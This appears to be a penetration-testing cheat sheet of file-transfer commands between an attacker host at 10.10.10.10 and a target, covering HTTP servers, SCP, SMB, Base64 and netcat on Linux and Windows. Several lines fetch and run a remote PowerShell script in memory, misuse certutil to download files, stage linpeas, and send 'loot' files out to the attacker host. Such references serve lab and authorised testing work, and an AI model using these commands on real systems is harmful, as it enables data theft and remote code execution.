## Web Server

|Operation|Command|Platform|
|---|---|---|
|Host (files)|`sudo python3 -m http.server 8000`|Linux|
|Host (upload)|`sudo python3 -m uploadserver 8000`|Linux|
|Download|`wget http://10.10.10.10:8000/linpeas.sh -O /tmp/linpeas.sh`|Linux|
|Download|`curl http://10.10.10.10:8000/linpeas.sh -o /tmp/linpeas.sh`|Linux|
|Download|`IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/script.ps1')`|Windows|
|Download (disk)|`(New-Object Net.WebClient).DownloadFile('http://10.10.10.10:8000/file.exe','C:\Temp\file.exe')`|Windows|
|Download|`certutil.exe -urlcache -split -f http://10.10.10.10:8000/file.exe C:\Temp\file.exe`|Windows|
|Upload|`curl -X POST http://10.10.10.10:8000/upload -F 'files=@/tmp/loot.txt'`|Linux|
|Upload|`Invoke-WebRequest -Uri http://10.10.10.10:8000/upload -Method POST -Body $b64`|Windows|

---

## SCP

|Operation|Command|Platform|
|---|---|---|
|Download|`scp user@192.168.1.50:/tmp/loot.txt /tmp/loot.txt`|Linux|
|Download|`scp user@192.168.1.50:/tmp/loot.txt C:\Temp\loot.txt`|Windows|
|Upload|`scp /tmp/tool.sh user@192.168.1.50:/tmp/tool.sh`|Linux|
|Upload|`scp C:\Temp\tool.exe user@192.168.1.50:/tmp/tool.exe`|Windows|

---

## SMB

|Operation|Command|Platform|
|---|---|---|
|Host|`impacket-smbserver -ip 10.10.10.10 -smb2support -username user -password password123 share /tmp/share`|Linux|
|Download|`copy \\10.10.10.10\share\file.exe C:\Temp\file.exe`|Windows|
|Upload|`copy C:\Temp\loot.txt \\10.10.10.10\share\loot.txt`|Windows|

---

## Base64

|Operation|Command|Platform|
|---|---|---|
|Encode|`base64 -w 0 /tmp/file.bin`|Linux|
|Decode|`echo <base64> \| base64 -d > /tmp/file.bin`|Linux|
|Encode|`[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\file.exe'))`|Windows|
|Decode|`[IO.File]::WriteAllBytes('C:\Temp\file.exe',[Convert]::FromBase64String('<base64>'))`|Windows|

---

## Netcat

|Operation|Command|Platform|
|---|---|---|
|Receive|`nc -lvnp 8000 > /tmp/file.bin`|Linux|
|Send|`nc 10.10.10.10 8000 < /tmp/file.bin`|Linux|
|Receive|`nc.exe -lvnp 8000 > C:\Temp\file.bin`|Windows|
|Send|`nc.exe 10.10.10.10 8000 < C:\Temp\file.bin`|Windows|